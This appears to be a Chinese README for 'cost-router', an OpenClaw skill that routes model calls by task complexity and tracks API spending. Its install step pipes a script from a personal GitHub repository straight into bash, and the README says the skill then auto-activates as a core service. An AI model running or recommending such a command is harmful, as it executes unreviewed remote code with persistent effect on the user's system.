# cost-router - 成本感知模型路由

智能路由模型调用，根据任务复杂度自动选择 cheapest 模型，节省 50-70% API 成本。

## 功能

- **复杂度评估**: 自动判断任务简单/中等/复杂
- **智能路由**: 
  - 简单 → MiniMax-M2.5 Lightning ($1/小时, 100 TPS)
  - 中等 → Kimi/Claude Sonnet
  - 复杂 → GPT-4/Claude Opus
- **预算监控**: 月度预算追踪，超支自动降级
- **成本报告**: 每日/每周/每月成本分析

## 安装

```bash
curl -fsSL https://raw.githubusercontent.com/jiajia4451/openclaw-skill-store/skills/install.sh | bash -s cost-router
```

## 系统服务配置

**自动激活**: 安装后自动成为 OpenClaw 核心组件

**配置项** (`~/.config/openclaw/cost-router.json`):
```json
{
  "monthly_budget": 50,
  "budget_currency": "USD",
  "models": {
    "simple": { "id": "minimax-m2.5", "cost_per_1k": 0.001 },
    "medium": { "id": "kimi-k2.5", "cost_per_1k": 0.005 },
    "complex": { "id": "gpt-4", "cost_per_1k": 0.03 }
  },
  "auto_fallback": true,
  "alert_threshold": 0.8
}
```

## 使用

自动生效，无需手动干预。可通过以下命令查看：

```bash
# 查看今日成本
cost-router today

# 查看本月预算使用
cost-router budget

# 强制使用特定模型
cost-router use gpt-4 "复杂任务内容"

# 查看路由统计
cost-router stats
```

## 成本节省示例

| 场景 | 原成本 | 路由后 | 节省 |
|------|--------|--------|------|
| 日常对话 | GPT-4 $0.03/1K | MiniMax $0.001/1K | 97% |
| 中等分析 | GPT-4 $0.03/1K | Kimi $0.005/1K | 83% |
| 复杂编程 | GPT-4 $0.03/1K | GPT-4 $0.03/1K | 0% |

## 状态

- **版本**: v1.0.0
- **作者**: OpenClaw
- **类型**: 系统服务 (自动激活)
- **依赖**: None